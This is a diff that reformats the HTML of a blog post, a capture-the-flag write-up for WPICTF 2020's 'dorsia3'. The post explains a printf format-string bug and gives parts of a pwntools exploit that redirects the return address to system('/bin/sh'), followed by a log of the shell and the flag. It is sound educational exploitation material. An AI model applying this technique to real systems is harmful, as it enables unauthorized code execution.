@@ -1,47 +1,9 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>&#x200F;Nils's website - Dorsia3 without gadgets (WPICTF 2020)</title>
-    <link rel="stylesheet" type="text/css" href="/assets/css/highlighting.css">
-      <link rel="stylesheet" type="text/css" href="/assets/css/post.css">
-    <link rel="alternate" type="application/atom+xml" title="Nils's blog RSS" href="feed.xml">
-  </head>
-  <body>
-    <header>
-      <h1><a href="/">Nils's website</a></h1>
-    </header>
-    <main>
-      <h2>Dorsia3 without gadgets (WPICTF 2020)</h2>
-<h3 id="why-this-writeup">Why this writeup?</h3>
-
-<p>After the end of WPICTF, I looked at writeups so see how people solved
-different challenges, and realised that for dorsia1 and dorsia3, people had
-used a completely different approach, using magic gadgets, than the one I took,
-so I thought I would share what I did.</p>
-
-<h3 id="dorsia3-250pts-55-solves">dorsia3 250pts (55 solves)</h3>
-
-<h4 id="challenge-description">Challenge Description:</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The third card.
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#x200F;Nils's website - Dorsia3 without gadgets (WPICTF 2020)</title><link rel="stylesheet" type="text/css" href="/assets/css/highlighting.css"><link rel="stylesheet" type="text/css" href="/assets/css/post.css"><link rel="alternate" type="application/atom+xml" title="Nils's blog RSS" href="feed.xml"></head><body><header><h1><a href="/">Nils's website</a></h1></header><main><h2>Dorsia3 without gadgets (WPICTF 2020)</h2><h3 id="why-this-writeup">Why this writeup?</h3><p>After the end of WPICTF, I looked at writeups so see how people solved different challenges, and realised that for dorsia1 and dorsia3, people had used a completely different approach, using magic gadgets, than the one I took, so I thought I would share what I did.</p><h3 id="dorsia3-250pts-55-solves">dorsia3 250pts (55 solves)</h3><h4 id="challenge-description">Challenge Description:</h4><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The third card.
 
 nc dorsia3.wpictf.xyz 31337 or 31338 or 31339
 
 made by: awg
-</code></pre></div></div>
-
-<h4 id="attachments">Attachments</h4>
-
-<ul>
-  <li><a href="https://ctf.wpictf.xyz/files/4d325258ec2ab3df5383833fb30fe8aa/nanoprint?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTR9.Xp3VIg.mDHcGNvi4W0KGbA3cKtCHwYKc0E"><code class="language-plaintext highlighter-rouge">nanoprint</code></a></li>
-  <li><a href="https://ctf.wpictf.xyz/files/fe7a59ebaa5fc5e00deae6553bce0677/libc.so.6?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTV9.Xp3VIg.Z7c2-xFMKP-lfla8wamuBuImt0Y"><code class="language-plaintext highlighter-rouge">libc.so.6</code></a></li>
-</ul>
-
-<p>The third card on the video shows the following code:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</code></pre></div></div><h4 id="attachments">Attachments</h4><ul><li><a href="https://ctf.wpictf.xyz/files/4d325258ec2ab3df5383833fb30fe8aa/nanoprint?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTR9.Xp3VIg.mDHcGNvi4W0KGbA3cKtCHwYKc0E"><code class="language-plaintext highlighter-rouge">nanoprint</code></a></li><li><a href="https://ctf.wpictf.xyz/files/fe7a59ebaa5fc5e00deae6553bce0677/libc.so.6?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTV9.Xp3VIg.Z7c2-xFMKP-lfla8wamuBuImt0Y"><code class="language-plaintext highlighter-rouge">libc.so.6</code></a></li></ul><p>The third card on the video shows the following code:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 </span>
 <span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -50,22 +12,7 @@ made by: awg
 	<span class="n">fgets</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
 	<span class="n">printf</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 <span class="p">}</span>
-</code></pre></div></div>
-
-<p>Because, the program is printing untrusted user input with <code class="language-plaintext highlighter-rouge">printf</code>, a format
-string vulnerability can be exploited. We are also given the address of the
-buffer and the <code class="language-plaintext highlighter-rouge">system</code> function.</p>
-
-<p>With some local testing, with GDB, I realised that the return address was 113
-bytes after the address of the buffer <code class="language-plaintext highlighter-rouge">a</code>. <code class="language-plaintext highlighter-rouge">%n</code> will set the number of bytes
-written to the address pointed to by the pointed given as argument. So what we
-do, is we set the address of system, where the return pointer is and then set
-a pointer to <code class="language-plaintext highlighter-rouge">/bin/sh</code>, where system expects to find its first argument, in my
-case that was 121 bytes after the location of <code class="language-plaintext highlighter-rouge">a</code>.</p>
-
-<h4 id="the-final-exploit">The final exploit:</h4>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</code></pre></div></div><p>Because, the program is printing untrusted user input with <code class="language-plaintext highlighter-rouge">printf</code>, a format string vulnerability can be exploited. We are also given the address of the buffer and the <code class="language-plaintext highlighter-rouge">system</code> function.</p><p>With some local testing, with GDB, I realised that the return address was 113 bytes after the address of the buffer <code class="language-plaintext highlighter-rouge">a</code>. <code class="language-plaintext highlighter-rouge">%n</code> will set the number of bytes written to the address pointed to by the pointed given as argument. So what we do, is we set the address of system, where the return pointer is and then set a pointer to <code class="language-plaintext highlighter-rouge">/bin/sh</code>, where system expects to find its first argument, in my case that was 121 bytes after the location of <code class="language-plaintext highlighter-rouge">a</code>.</p><h4 id="the-final-exploit">The final exploit:</h4><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
 </span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -113,20 +60,7 @@ case that was 121 bytes after the location of <code class="language-plaintext hi
 <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># The output of `printf`
 </span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></div>
-
-<p>I trick I used, which I doubt the usefulness of is sorting the addresses I need
-to write to by the value they should have. This in theory means that less data
-has to be sent back when <code class="language-plaintext highlighter-rouge">printf</code> is executed on the server side. However it is
-not necessary.</p>
-
-<p>Initially, I tried to use a <code class="language-plaintext highlighter-rouge">/bin/sh</code> that was inside of <code class="language-plaintext highlighter-rouge">a</code> however, that
-failed so I fell back to using one inside of libc.</p>
-
-<p>After running the exploit, we get a shell on the target, running <code class="language-plaintext highlighter-rouge">ls</code> reveals
-that the flag is in the current directory and we can now just <code class="language-plaintext highlighter-rouge">cat</code> it:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./exploit.py
+</code></pre></div></div><p>I trick I used, which I doubt the usefulness of is sorting the addresses I need to write to by the value they should have. This in theory means that less data has to be sent back when <code class="language-plaintext highlighter-rouge">printf</code> is executed on the server side. However it is not necessary.</p><p>Initially, I tried to use a <code class="language-plaintext highlighter-rouge">/bin/sh</code> that was inside of <code class="language-plaintext highlighter-rouge">a</code> however, that failed so I fell back to using one inside of libc.</p><p>After running the exploit, we get a shell on the target, running <code class="language-plaintext highlighter-rouge">ls</code> reveals that the flag is in the current directory and we can now just <code class="language-plaintext highlighter-rouge">cat</code> it:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./exploit.py
 [+] Opening connection to dorsia3.wpictf.xyz on port 31337: Done
 [*] 'wpictf_2020/dorsia3/libc.so.6'
     Arch:     i386-32-little
@@ -142,18 +76,4 @@ run_problem.sh
 stdbuf
 $ cat flag.txt
 WPI{Th3re_is_an_idea_of_4_Pa7rick_BatemaN}
-</code></pre></div></div>
-
-<p>This however, isn’t the easiest way to solve the challenge as it is takes more
-time. If you haven’t already, I’d recommend reading <a href="https://ctftime.org/task/11316">other write-ups</a> as
-well to explore the different methods that can be used.</p>
-
-
-<time datetime="2020-04-20">20 April 2020</time>
-
-    </main>
-    <footer>
-      &copy; 2021 <a href="https://www.nilsand.re/">Nils André</a>
-    </footer>
-  </body>
-</html>
+</code></pre></div></div><p>This however, isn’t the easiest way to solve the challenge as it is takes more time. If you haven’t already, I’d recommend reading <a href="https://ctftime.org/task/11316">other write-ups</a> as well to explore the different methods that can be used.</p><time datetime="2020-04-20">20 April 2020</time></main><footer> &copy; 2021 <a href="https://www.nilsand.re/">Nils André</a></footer></body></html>
